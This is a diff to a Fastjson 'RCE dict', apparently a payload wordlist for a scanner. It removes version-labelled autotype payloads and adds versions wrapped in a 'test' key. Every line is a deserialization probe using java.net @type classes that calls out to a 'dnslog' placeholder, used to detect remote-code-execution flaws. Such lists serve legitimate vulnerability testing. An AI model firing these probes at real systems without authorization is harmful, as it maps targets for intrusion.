@@ -1,19 +1,8 @@
 # Fastjson RCE dict
 
-# fastjson <1.2.43
-{"@type":"java.net.URL","val":"dnslog"}
-{{"@type":"java.net.URL","val":"dnslog"}:"x"}
-
-# fastjson <1.2.48
-{"@type":"java.net.InetAddress","val":"dnslog"}
-
-# fastjson <1.2.68
-{"@type":"java.net.Inet4Address","val":"dnslog"}
-{"@type":"java.net.Inet6Address","val":"dnslog"}
-{{"@type":"java.net.URL","val":"dnslog"}:"aaa"}
-{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"dnslog"}}""}
-Set[{"@type":"java.net.URL","val":"dnslog"}]
-Set[{"@type":"java.net.URL","val":"dnslog"}
-{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}
-{{"@type":"java.net.URL","val":"dnslog"}:0
-[{"@type":"java.net.CookiePolicy"},{"@type":"java.net.Inet4Address","val":"dnslog"}]
+{"test":{"@type":"java.net.URL","val":"dnslog"}}
+{"test":{"@type":"java.net.InetAddress","val":"dnslog"}}
+{"test":{"@type":"java.net.Inet4Address","val":"dnslog"}}
+{"test":{"@type":"java.net.Inet6Address","val":"dnslog"}}
+{"test":{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"dnslog"}}""}
+{"test":{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}}
